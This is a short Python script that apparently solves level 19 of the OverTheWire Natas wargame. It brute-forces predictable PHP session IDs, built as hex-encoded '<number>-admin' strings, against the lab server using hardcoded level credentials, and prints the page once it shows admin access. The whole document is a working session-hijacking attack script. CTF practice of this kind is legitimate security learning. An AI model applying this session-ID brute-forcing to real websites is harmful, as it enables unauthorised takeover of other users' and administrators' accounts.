#!/usr/bin/env python3
import requests
import sys

auth_username = 'natas19'
auth_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
admin_str = 'You are an admin.'
ssid_t = '{}2d61646d696e'
url = 'http://natas19.natas.labs.overthewire.org/index.php'

def test(ssid):
    cookies = { 'PHPSESSID': ssid }
    print("test %s" % cookies['PHPSESSID'])
    r = requests.get(url, cookies=cookies, auth=(auth_username,auth_password))

    if admin_str in r.text:
        print(r.text)
        sys.exit(0)

for i in range(0, 1000):
    test(ssid_t.format(str(i).encode().hex()))
